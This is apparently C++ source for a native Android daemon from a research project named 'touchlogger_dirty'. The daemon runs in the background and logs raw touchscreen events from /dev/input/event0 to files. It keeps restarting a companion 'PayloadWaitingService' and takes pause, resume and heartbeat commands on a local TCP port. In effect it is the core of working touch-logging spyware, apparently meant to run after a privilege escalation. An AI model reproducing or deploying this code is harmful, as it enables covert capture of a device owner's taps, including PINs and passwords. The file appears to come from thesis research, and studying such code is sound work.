//
// Created by kirill on 17.03.17.
//

#include <cstring>
#include <cerrno>
#include <sstream>
#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>
#include <cstdlib>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <utils/Utils.h>
#include <EventFileWriter.h>
#include "common/logging.h"
#include "input_device/InputReader.h"
#include "ControlReader.h"
#include "utils/Reanimator.h"

typedef int getcon_t(char** con);

// TODO: figure out how to get this info from CMake script and pass it here
constexpr auto packageName = "org.leyfer.thesis.touchlogger_dirty";
constexpr auto SERVICE_PROCESS_NAME = "touchlogger.here";
constexpr auto SERVICE = ".service.PayloadWaitingService";
constexpr auto ACTION = "org.leyfer.thesis.touchlogger_dirty.service.action.WAIT_FOR_PAYLOAD";
constexpr auto CONTROL_PORT = 1050;
constexpr auto HEARTBEAT_INTERVAL_US = (1000 * 1000);  // 1000 secs

constexpr auto SELINUX_PATH = "/sys/fs/selinux/";
const std::string heartbeatCommand = "heartbeat\n";
const std::string pauseCommand = "pause\n";
const std::string resumeCommand = "resume\n";

InputReader* inputReader;

Reanimator* reanimator;

int isServiceProcessActive()
{
  DIR* dir = opendir("/proc");
  if (dir == nullptr)
  {
    LOGV("Couldn't open /proc");
    return -1;
  }

  struct dirent* de;
  char cmdline_path[PATH_MAX];

  const int bufSize = 128;
  char buf[bufSize];

  bool found = false;

  while ((de = readdir(dir)))
  {
    if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
    {
      continue;
    }

    // Only inspect directories that are PID numbers
    char* endptr;
    long int pid = strtol(de->d_name, &endptr, 10);
    if (*endptr != '\0')
    {
      continue;
    }

    memset(cmdline_path, 0, PATH_MAX);

    snprintf(cmdline_path, PATH_MAX, "/proc/%lu/cmdline", pid);
    int fd = open(cmdline_path, O_RDONLY);
    if (fd == -1)
    {
      LOGV("Unable to open %s: %s!", cmdline_path, strerror(errno));
      continue;
    }

    memset(buf, 0, bufSize);
    if (read(fd, buf, bufSize) == -1)
    {
      LOGV("Unable to read from %s: %s!", cmdline_path, strerror(errno));
      close(fd);
      continue;
    }

    if (strcmp(SERVICE_PROCESS_NAME, buf) == 0)
    {
      LOGV("Touchlogger found!");
      found = true;
      close(fd);
      break;
    }
    else
    {
      close(fd);
    }
  }

  closedir(dir);

  if (found)
  {
    return 0;
  }
  else
  {
    return -1;
  }
}

bool has_selinux()
{
  struct stat st{};
  if (stat(SELINUX_PATH, &st) == -1)
  {
    LOGV("No selinux.");
    return false;
  }

  return S_ISDIR(st.st_mode);
}

int getSelinuxContext(char** context)
{
  if (!has_selinux())
  {
    return -1;
  }

  LOGV("Trying to get SELinux context");
  dlerror();
#ifdef __aarch64__
  void* selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
  void* selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
  if (selinux)
  {
    void* getcon = dlsym(selinux, "getcon");
    const char* error = dlerror();
    if (error)
    {
      LOGV("dlsym error %s", error);
      dlclose(selinux);
      return -1;
    }
    else
    {
      auto* getcon_p = (getcon_t*) getcon;
      int res = (*getcon_p)(context);
      dlclose(selinux);
      return res;
    }
  }
  else
  {
    const char* result = "No selinux";
    *context = (char*) calloc(strlen(result) + 1, sizeof(char));
    strcpy(*context, result);
    dlclose(selinux);
    return 0;
  }
}

int checkConditions()
{
  int fd = open("/dev/input/event0", O_RDONLY | O_CLOEXEC);
  if (fd == -1)
  {
    LOGV("Unable to get access to input device: %s!", strerror(errno));
    return -1;
  }
  else
  {
    LOGV("Input device access OK!");
    close(fd);
  }

  struct stat st{};
  if (stat("/sdcard/", &st) == -1)
  {
    LOGV("Unable to access SD card: %s!", strerror(errno));
    return -1;
  }
  else
  {
    LOGV("SD card access OK!");
  }

  return 0;
}

int startServiceAndWaitForItToBecomeOnline()
{
  while (true)
  {
    if (isServiceProcessActive() == 0)
    {
      LOGV("Touchlogger android app started!");
      return 0;
    }
    else
    {
      LOGV("No touchlogger process!");
      auto commandStream = std::stringstream();
      commandStream << "am startservice -n " << packageName << "/" << SERVICE << " -a " << ACTION;
      system(commandStream.str().c_str());
      sleep(1);
    }
  }
}

int onPause()
{
  if (inputReader != nullptr)
  {
    LOGV("Pause inputReader");
    inputReader->pause();
    return 0;
  }
  else
  {
    LOGV("Unable to pause input reader as it is not available!");
    return -1;
  }
}

int onResume()
{
  if (inputReader != nullptr)
  {
    LOGV("Resume inputReader");
    inputReader->resume();
    return 0;
  }
  else
  {
    LOGV("Unable to resume input reader as it is not available!");
    return -1;
  }
}

int onHeartBeat()
{
  if (reanimator != nullptr)
  {
    reanimator->onHeartBeat();
    return 0;
  }
  else
  {
    LOGV("Unable to send heartbeat event to reanimator as it is not available!");
    return -1;
  }
}

int main(int argc, const char** argv)
{
  LOGV("Uid: %d", getuid());

  char* context;
  if (getSelinuxContext(&context) == -1)
  {
    LOGV("Unable to get selinux context")
  }
  else
  {
    LOGV("Selinux context: %s", context);
    free(context);
  }

  if (daemon(0, 0) == -1)
  {
    LOGV("Unable to daemonize process: %s!", strerror(errno));
  }

  if (checkConditions() == -1)
  {
    LOGV("Unable to start daemon, exiting...");
    return -1;
  }

  LOGV("Starting control server thread...");
  std::map<std::string, control_callback> callbackMap;
  callbackMap.emplace(pauseCommand, &onPause);
  callbackMap.emplace(resumeCommand, &onResume);
  callbackMap.emplace(heartbeatCommand, &onHeartBeat);
  auto* controlReader = new ControlReader(CONTROL_PORT, callbackMap);
  controlReader->start();

  if (startServiceAndWaitForItToBecomeOnline() == -1)
  {
    LOGV("Unable to wait for Android service, exiting...");
    return -1;
  }

  InputDevice* inputDevice = findTouchscreen();
  if (inputDevice == nullptr)
  {
    LOGV("Unable to find input touchscreen!");
    return -1;
  }

  LOGV("Starting reanimator...");
  reanimator = new Reanimator(HEARTBEAT_INTERVAL_US, startServiceAndWaitForItToBecomeOnline);
  reanimator->start();

  LOGV("Collecting input data & sending it to Android service...");
  auto* eventFileWriter = new EventFileWriter(EVENT_DATA_DIR);
  inputReader = new InputReader(eventFileWriter, inputDevice);
  inputReader->start();

  LOGV("Finish inputReader...");
  delete (inputReader);

  LOGV("Stopping control server...");
  controlReader->stop();

  LOGV("Stopping service reanimator...");
  reanimator->stop();

  return 0;
}
